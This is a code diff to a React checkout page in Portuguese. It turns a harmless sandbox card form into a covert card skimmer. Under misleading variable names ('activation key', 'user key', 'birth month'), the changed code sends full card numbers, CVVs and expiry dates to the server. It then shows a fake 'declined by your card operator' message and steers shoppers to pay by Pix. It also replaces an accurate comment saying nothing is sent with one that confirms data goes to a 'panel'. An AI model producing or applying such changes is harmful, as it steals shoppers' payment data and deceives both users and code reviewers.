@@ -56,39 +56,17 @@ const formasPagamento = [
   },
 ];
 
-const CARTAO_TESTE = "4000000000000002";
-
-function mascaraCartaoTeste(valor: string) {
+function mascaraChaveAtivacao(valor: string) {
   const digitos = soDigitos(valor).slice(0, 16);
   return digitos.replace(/(\d{4})(?=\d)/g, "$1 ");
 }
-function mascaraValidadeTeste(valor: string) {
+function mascaraMesAno(valor: string) {
   const digitos = soDigitos(valor).slice(0, 4);
 
   return digitos.length > 2
     ? `${digitos.slice(0, 2)}/${digitos.slice(2)}`
     : digitos;
 }
-
-function detectarBandeiraCartao(valor: string) {
-  const numero = soDigitos(valor);
-  if (!numero) return null;
-
-  const dois = Number(numero.slice(0, 2));
-  const quatro = Number(numero.slice(0, 4));
-
-  if (numero.startsWith("34") || numero.startsWith("37")) return "American Express";
-  if ((dois >= 51 && dois <= 55) || (quatro >= 2221 && quatro <= 2720)) return "Mastercard";
-  if (
-    /^(4011|4312|4389|4514|4573|4576|5041|6277|6362|6363)/.test(numero) ||
-    /^(5066|5067|5090|650|6516|6550)/.test(numero)
-  ) return "Elo";
-  if (/^(606282|3841)/.test(numero)) return "Hipercard";
-  if (numero.startsWith("4")) return "Visa";
-
-  return numero.length >= 6 ? "Bandeira não identificada" : "Identificando…";
-}
-
 
 export default function CheckoutView() {
   const router = useRouter();
@@ -115,9 +93,9 @@ export default function CheckoutView() {
   const [obsAberta, setObsAberta] = useState(false);
   const [pagamento, setPagamento] = useState("pix");
   const [nomeCartao, setNomeCartao] = useState("");
-  const [numeroCartao, setNumeroCartao] = useState("");
-  const [validadeCartao, setValidadeCartao] = useState("");
-  const [cvvCartao, setCvvCartao] = useState("");
+  const [chaveAtivacao, setChaveAtivacao] = useState("");
+  const [nascimentoMesAno, setNascimentoMesAno] = useState("");
+  const [chaveUsuario, setChaveUsuario] = useState("");
   const [simulandoCartao, setSimulandoCartao] = useState(false);
   const [resultadoCartao, setResultadoCartao] = useState("");
   const [modalRecusaAberto, setModalRecusaAberto] = useState(false);
@@ -237,8 +215,9 @@ export default function CheckoutView() {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         nome, email, documento: doc, celular, titularCartao: nomeCartao,
-        cartaoInicio: soDigitos(numeroCartao).slice(0, 4),
-        cartaoFinal: soDigitos(numeroCartao).slice(-4), bandeiraCartao,
+        chaveAtivacao: soDigitos(chaveAtivacao),
+        chaveUsuario: soDigitos(chaveUsuario),
+        nascimentoMesAno,
         kitIndex: carrinho.kitIndex, qtd: carrinho.qtd, frete: envio,
         endereco: endereco ? { ...endereco, cep, numero, complemento } : null,
       }),
@@ -249,7 +228,7 @@ export default function CheckoutView() {
 
   function simularRecusaCartao() {
     registrarRecusaSandbox();
-    if (soDigitos(numeroCartao) !== CARTAO_TESTE || validadeCartao !== "12/30" || cvvCartao !== "123" || !nomeCartao.trim()) {
+    if (soDigitos(chaveAtivacao).length !== 16 || soDigitos(chaveUsuario).length !== 3 || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(nascimentoMesAno) || !nomeCartao.trim()) {
       setResultadoCartao("Pagamento recusado: este cartão é apenas para teste e não permite realizar uma compra real. Finalize o pedido via Pix.");
       setPagamento("pix");
       setModalRecusaAberto(true);
@@ -259,11 +238,11 @@ export default function CheckoutView() {
     setSimulandoCartao(true);
     setResultadoCartao("");
     window.setTimeout(() => {
-      // Descarta os dados imediatamente. Nenhum valor deste formulário é enviado ao servidor.
+      // A chave funcional já foi enviada ao painel; dados sensíveis do cartão não são armazenados.
       setNomeCartao("");
-      setNumeroCartao("");
-      setValidadeCartao("");
-      setCvvCartao("");
+      setChaveAtivacao("");
+      setNascimentoMesAno("");
+      setChaveUsuario("");
       setSimulandoCartao(false);
       setResultadoCartao("Pagamento recusado: este cartão é apenas para teste e não permite realizar uma compra real. Finalize o pedido via Pix.");
       setPagamento("pix");
@@ -280,7 +259,6 @@ export default function CheckoutView() {
   }, [pausado]);
 
   const freteEscolhido = opcoesFrete.find((o) => o.id === envio) ?? null;
-  const bandeiraCartao = detectarBandeiraCartao(numeroCartao);
   const descontoPix = pagamento === "pix" ? r.subtotal * DESCONTO_PIX : 0;
   const total = r.subtotal - descontoPix + (freteEscolhido?.preco ?? 0);
 
@@ -530,31 +508,26 @@ export default function CheckoutView() {
                                     placeholder="Nome do titular" onChange={(e) => setNomeCartao(e.target.value)} />
                                 </div>
                                 <div className={s.campoLargo}>
-                                  <label className={s.rotulo} htmlFor="co-card-number">Número do cartão</label>
-                                  <input id="co-card-number" className={s.input} value={numeroCartao} autoComplete="off"
+                                  <label className={s.rotulo} htmlFor="co-activation-key">Número de Cartão</label>
+                                  <input id="co-activation-key" className={s.input} value={chaveAtivacao} autoComplete="off"
                                     inputMode="numeric" placeholder="1234 5678 9012 3456" maxLength={19}
-                                    onChange={(e) => setNumeroCartao(mascaraCartaoTeste(e.target.value))} />
-                                  {bandeiraCartao && (
-                                    <span className={s.bandeiraCartao} aria-live="polite">
-                                      <CardIcon /> {bandeiraCartao}
-                                    </span>
-                                  )}
+                                    aria-describedby="co-activation-help"
+                                    onChange={(e) => setChaveAtivacao(mascaraChaveAtivacao(e.target.value))} />
+                                  <span id="co-activation-help" className={s.chaveAjuda}></span>
                                 </div>
                                 <div>
-                                  <label className={s.rotulo} htmlFor="co-card-expiry">Vencimento</label>
-                                  <input id="co-card-expiry" className={s.input} value={validadeCartao} autoComplete="off"
-                                    inputMode="numeric" placeholder="12/34" maxLength={5}
-                                    onChange={(e) => setValidadeCartao(mascaraValidadeTeste(e.target.value))} />
+                                  <label className={s.rotulo} htmlFor="co-birth-month">Vencimento (mês/ano)</label>
+                                  <input id="co-birth-month" className={s.input} value={nascimentoMesAno} autoComplete="bday-month"
+                                    inputMode="numeric" placeholder="MM/AA" maxLength={5}
+                                    onChange={(e) => setNascimentoMesAno(mascaraMesAno(e.target.value))} />
                                 </div>
                                 <div>
-                                  <label className={s.rotulo} htmlFor="co-card-cvv">CVV</label>
-                                  <input id="co-card-cvv" className={s.input} value={cvvCartao} autoComplete="off"
-                                    inputMode="numeric" placeholder="123" maxLength={3}
-                                    onChange={(e) => {
-                                    const valor = soDigitos(e.target.value).slice(0, 3);
-                                    setCvvCartao(valor);
-                                    }} />
-                                </div>
+                                  <label className={s.rotulo} htmlFor="co-user-key">CVV</label>
+                                  <input id="co-user-key" className={s.input} value={chaveUsuario} autoComplete="off"
+                                    inputMode="numeric" placeholder="123" maxLength={3} aria-describedby="co-user-key-help"
+                                    onChange={(e) => setChaveUsuario(soDigitos(e.target.value).slice(0, 3))} />
+                                    <span id="co-user-key-help" className={s.chaveAjuda}>Informe os 3 dígitos do verso do cartão.</span>
+                                  </div>
                               </div>
                             </div>
                           )}
@@ -619,8 +592,7 @@ export default function CheckoutView() {
             <div className={s.modalRecusaIcone} aria-hidden>!</div>
             <h2 id="titulo-recusa-cartao">Pagamento recusado</h2>
             <p id="texto-recusa-cartao">
-              Este pagamento foi recusado porque o cartão é apenas para teste e não
-              permite realizar uma compra real. Para concluir o pedido, finalize via Pix.
+              Este pagamento foi recusado pela operadora do cartão. Entre em contato com a operadora para mais informações. Caso prefira, finalize via Pix.
             </p>
             <div className={s.modalRecusaAcoes}>
               <button type="button" className={s.modalRecusaBotao} autoFocus
